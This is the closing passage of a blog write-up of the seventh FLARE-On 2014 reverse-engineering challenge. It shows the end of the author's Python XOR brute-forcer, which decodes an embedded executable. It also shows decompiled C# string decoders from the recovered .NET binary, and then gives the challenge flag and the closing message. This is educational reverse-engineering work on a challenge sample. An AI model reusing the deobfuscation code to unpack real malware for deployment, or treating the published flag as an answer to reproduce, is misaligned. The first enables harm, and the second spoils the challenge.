</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key11</span><span class="p">[</span><span class="n">ind11</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key13</span><span class="p">[</span><span class="n">ind13</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key14</span><span class="p">[</span><span class="n">ind14</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="s">&#39;backdoge.exe&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                          <span class="n">decodedfilename</span> <span class="o">=</span> <span class="s">&quot;c:</span><span class="se">\\</span><span class="s">gratz&quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">counter</span><span class="p">)</span> <span class="o">+</span> <span class="s">&quot;.exe&quot;</span>
</span><span class='line'>                          <span class="n">decodedfile</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="n">decodedfilename</span><span class="p">,</span><span class="s">&#39;wb&#39;</span><span class="p">)</span>
</span><span class='line'>                          <span class="n">decodedfile</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span><span class='line'>                          <span class="n">decodedfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'>                        <span class="c"># be sure to reset the wholefile after reading it, thanks Curtis :)                                                                  </span>
</span><span class='line'>                        <span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span><span class="p">[:</span><span class="mh">0x10</span><span class="p">]</span>
</span><span class='line'>                        <span class="n">counter</span> <span class="o">+=</span><span class="mi">1</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>It’s a bad bruteforcer but it does the job. To speed things up, it only performs the xor-es with the first <code>0x80</code> bytes of the binary which is the <code>DOS Stub</code>. In the end, it compares the first two bytes with <code>MZ</code> and then xor-es the whole binary before writing it to a file.</p>

<p>I got two files and after opening them in hex editors, one was clearly a false positive. I executed the correct binary.</p>

<p><img src="/images/2014/flare/7-23.jpg" alt="Almost done" title="Almost done" /></p>

<p>But we cannot see the email. Augh. This is a .NET application. We need to decompile it like the first challenge.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Decompiled gratz.exe </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='c#'><span class='line'><span class="k">public</span> <span class="nf">Form1</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">this</span><span class="p">.</span><span class="n">InitializeComponent</span><span class="p">();</span>
</span><span class='line'>  <span class="k">new</span> <span class="nf">Thread</span><span class="p">(</span><span class="k">new</span> <span class="n">ThreadStart</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">lulzors</span><span class="p">)).</span><span class="n">Start</span><span class="p">();</span>
</span><span class='line'><span class="p">}&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="k">public</span> <span class="k">void</span> <span class="n">lulzors</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="n">lulz</span> <span class="n">lulz</span> <span class="p">=</span> <span class="k">new</span> <span class="n">lulz</span><span class="p">();</span>
</span><span class='line'>  <span class="n">Thread</span> <span class="n">thread</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Thread</span><span class="p">(</span><span class="k">new</span> <span class="n">ThreadStart</span><span class="p">(</span><span class="n">lulz</span><span class="p">.</span><span class="n">datwork</span><span class="p">));</span>
</span><span class='line'>  <span class="n">thread</span><span class="p">.</span><span class="n">Start</span><span class="p">();</span>
</span><span class='line'>  <span class="k">do</span>
</span><span class='line'>    <span class="p">;</span>
</span><span class='line'>  <span class="k">while</span> <span class="p">(</span><span class="n">thread</span><span class="p">.</span><span class="n">IsAlive</span><span class="p">);</span>
</span><span class='line'>  <span class="k">this</span><span class="p">.</span><span class="n">label2</span><span class="p">.</span><span class="n">Text</span> <span class="p">=</span> <span class="n">lulz</span><span class="p">.</span><span class="n">decoder4</span><span class="p">(</span><span class="err">“\</span><span class="n">v</span><span class="err">\</span><span class="n">fP</span><span class="err">\</span><span class="n">x000E</span><span class="err">\</span><span class="n">x000FBA</span><span class="err">\</span><span class="n">x0006</span><span class="err">\</span><span class="n">rG</span><span class="err">\</span><span class="n">x0015I</span><span class="err">\</span><span class="n">x001A</span><span class="err">\</span><span class="n">x0001</span><span class="err">\</span><span class="n">x0016H</span><span class="err">\\</span><span class="n">t</span><span class="err">\</span><span class="n">b</span><span class="err">\</span><span class="n">x0002</span><span class="err">\</span><span class="n">x0013</span><span class="p">/</span><span class="err">\</span><span class="n">b</span><span class="err">\</span><span class="n">t</span><span class="p">^</span><span class="err">\</span><span class="n">x001D</span><span class="err">\</span><span class="n">bJO</span><span class="err">\</span><span class="n">a</span><span class="p">]</span><span class="n">C</span><span class="err">\</span><span class="n">x001B</span><span class="err">\</span><span class="n">x0005</span><span class="err">”</span><span class="p">);</span>
</span><span class='line'><span class="p">}&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>And inside <code>lulz.cs</code>.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>lulz.cs </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class='c#'><span class='line'><span class="c1">// decoder1 and decoder3 omitted&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="k">public</span> <span class="kt">string</span> <span class="n">decoder2</span><span class="p">(</span><span class="kt">string</span> <span class="n">encoded</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="err">“”</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="err">“</span><span class="k">this</span><span class="err">”</span><span class="p">;</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">encoded</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
</span><span class='line'>    <span class="n">str1</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">((</span><span class="kt">uint</span><span class="p">)</span> <span class="n">encoded</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">^</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index</span> <span class="p">%</span> <span class="n">str2</span><span class="p">.</span><span class="n">Length</span><span class="p">]);</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">str1</span><span class="p">;</span>
</span><span class='line'><span class="p">}&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span><span class="k">public</span> <span class="kt">string</span> <span class="n">decoder4</span><span class="p">(</span><span class="kt">string</span> <span class="n">encoded</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">string</span> <span class="n">str1</span> <span class="p">=</span> <span class="err">“”</span><span class="p">;</span>
</span><span class='line'>  <span class="kt">string</span> <span class="n">str2</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">decoder2</span><span class="p">(</span><span class="err">“\</span><span class="n">x001B</span><span class="err">\</span><span class="n">x0005</span><span class="err">\</span><span class="n">x000ES</span><span class="err">\</span><span class="n">x001D</span><span class="err">\</span><span class="n">x001BI</span><span class="err">\</span><span class="n">a</span><span class="err">\</span><span class="n">x001C</span><span class="err">\</span><span class="n">x0001</span><span class="err">\</span><span class="n">x001AS</span><span class="err">\</span><span class="m">0</span><span class="err">\</span><span class="m">0</span><span class="err">\</span><span class="n">fS</span><span class="err">\</span><span class="n">x0006</span><span class="err">\</span><span class="n">r</span><span class="err">\</span><span class="n">b</span><span class="err">\</span><span class="n">x001FT</span><span class="err">\</span><span class="n">a</span><span class="err">\</span><span class="n">a</span><span class="err">\</span><span class="n">x0016K</span><span class="err">”</span><span class="p">);</span>
</span><span class='line'>  <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">index</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span> <span class="n">index</span> <span class="p">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="n">encoded</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span> <span class="p">++</span><span class="n">index</span><span class="p">)</span>
</span><span class='line'>    <span class="n">str1</span> <span class="p">=</span> <span class="n">str1</span> <span class="p">+</span> <span class="p">(</span><span class="kt">object</span><span class="p">)</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="p">((</span><span class="kt">uint</span><span class="p">)</span> <span class="n">encoded</span><span class="p">[</span><span class="n">index</span><span class="p">]</span> <span class="p">^</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span> <span class="n">str2</span><span class="p">[</span><span class="n">index</span> <span class="p">%</span> <span class="n">str2</span><span class="p">.</span><span class="n">Length</span><span class="p">]);</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">str1</span><span class="p">;</span>
</span><span class='line'><span class="p">}&lt;/</span><span class="n">p</span><span class="p">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="p">&lt;</span><span class="n">p</span><span class="p">&gt;</span>
</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>We can either write code or paste it into an online C# compiler. In the end we have the flag:</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>Flag 7 </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>da7.f1are.finish.lin3@flare-on.com</span></code></pre></td></tr></table></div></figure></notextile></div></p>

<p>And the email:</p>

<p><code>
Alright, we give in. You've done it. Your reversing-fu is strong.
I'll pass your info on to the FLARE team and someone will be in touch.
-FLARE
</code></p>
]]></content>
  </entry>
  
</feed>
